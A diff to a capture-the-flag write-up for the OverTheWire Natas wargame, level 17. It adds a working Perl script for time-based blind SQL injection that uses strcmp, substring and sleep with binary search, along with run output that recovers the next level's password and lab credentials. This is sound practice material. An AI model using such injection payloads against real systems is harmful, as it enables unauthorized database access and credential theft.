@@ -476,7 +476,7 @@ say $flag;
 
 Alas, the flag is: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 
-## 17 - Time what is time?
+## 17 - Time what is time? - xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 
 ```php
 /*
@@ -575,17 +575,107 @@ my @possible_characters = split('', '0123456789abcdefghijklmnopqrstuvwxyzABCDEFG
 Using `strcmp` along with `substring` we can use binary search over the possible chars array to make discovery faster.
 
 ```perl
-my $payload = "natas18\" and strcmp(BINARY substring(password, $index, 1), \"$char\") > 0 and sleep(2) #"
+my $payload = "natas18\" and strcmp(BINARY substring(password, $index, 1), \"$char\") > 0 and sleep(5) #"
 ```
 
 And say we have already matched a previous prefix of the password, lets say `$flag = aBcDe`.
 
-Then we can:
+Then we can, for each of the 32 password characters:
 
-1. Start with `$index = 1` (mysql is **not** zero-indexed)
-2. Get the middle char from array of possible chars and set it to `$char`
-3. evaluate if the `$payload` above causes the request to take longer than 2 seconds
-4. if the request takes longer, it means the desired character is in the bottom half of the array, so go back to #2, passing the bottom half.
-5. if, however, the request is fast, we will know that the next character is in fact in the upper half of the possible characters array. Go back to #1 passing the upper half.
+1. Start with `$index = 1` (mysql is **not** zero-indexed).
+2. set a `$lowerBound` and `$upperBound`, which will yield a `$charIndex` and a `$char`.
+3. evaluate if the `$payload` above causes the request to timeout (set a timout lower than the sleep, but fairly high).
+4. if the request takes longer, it means the desired character is in the upper half of the array, so go back to #2, passing the upper half indices.
+5. if, however, the request is fast, we will know that the next character is in fact in the lower half of the possible characters array. Go back to #1 passing the lower half indices.
 
-I'm tired, will continue tomorrow...
+And this was my implementation.
+
+```perl
+#!/usr/bin/perl
+use strict;
+use warnings;
+use v5.10;
+use LWP::UserAgent;
+use HTTP::Request::Common;
+use Try::Tiny;
+
+my $url = 'http://natas17.natas.labs.overthewire.org/index.php';
+my $ua = LWP::UserAgent->new();
+my @chars = split('', '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz');
+
+sub make_request_with {
+	my ($index, $char) = @_;
+  my $payload = "natas18\" and strcmp(BINARY substring(password, $index, 1), \"$char\") > 0 and sleep(5) #";
+
+	my $request = POST $url, Content => [ username => $payload ];
+	$request->authorization_basic('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw');
+  $ua->timeout(4);
+	my $response = $ua->request($request);
+  die if $response->is_error;
+}
+
+sub get_passwd_char_at_index {
+	my ($index, $lower_bound, $upper_bound) = @_;
+
+  # recursive condition check
+	return $chars[$lower_bound] if ($lower_bound > $upper_bound);
+
+	my $char_index = int( ($lower_bound + $upper_bound) / 2 );
+
+	try {
+		make_request_with($index, $chars[$char_index]);
+		return get_passwd_char_at_index($index, $lower_bound, $char_index - 1);
+	} catch {
+		# req timed out, so answer is on upper half
+		return get_passwd_char_at_index($index, $char_index + 1, $upper_bound);
+	}
+}
+
+print "Sploiting...\n";
+# we know passwords are 32 in length, so
+my $length = @chars;
+my $flag = '';
+foreach (1..32) {
+	$flag .= get_passwd_char_at_index($_, 0, $length - 1);
+  print "$flag\n";
+}
+```
+
+Which resulted in:
+
+```
+% /overthewire-natas > master ● > perl bsf.pl
+Sploiting...
+x
+xv
+xvK
+xvKI
+xvKIq
+xvKIqD
+xvKIqDj
+xvKIqDjy
+xvKIqDjy4
+xvKIqDjy4O
+xvKIqDjy4OP
+xvKIqDjy4OPv
+xvKIqDjy4OPv7
+xvKIqDjy4OPv7w
+xvKIqDjy4OPv7wC
+xvKIqDjy4OPv7wCR
+xvKIqDjy4OPv7wCRg
+xvKIqDjy4OPv7wCRgD
+xvKIqDjy4OPv7wCRgDl
+xvKIqDjy4OPv7wCRgDlm
+xvKIqDjy4OPv7wCRgDlmj
+xvKIqDjy4OPv7wCRgDlmj0
+xvKIqDjy4OPv7wCRgDlmj0p
+xvKIqDjy4OPv7wCRgDlmj0pF
+xvKIqDjy4OPv7wCRgDlmj0pFs
+xvKIqDjy4OPv7wCRgDlmj0pFsC
+xvKIqDjy4OPv7wCRgDlmj0pFsCs
+xvKIqDjy4OPv7wCRgDlmj0pFsCsD
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+```
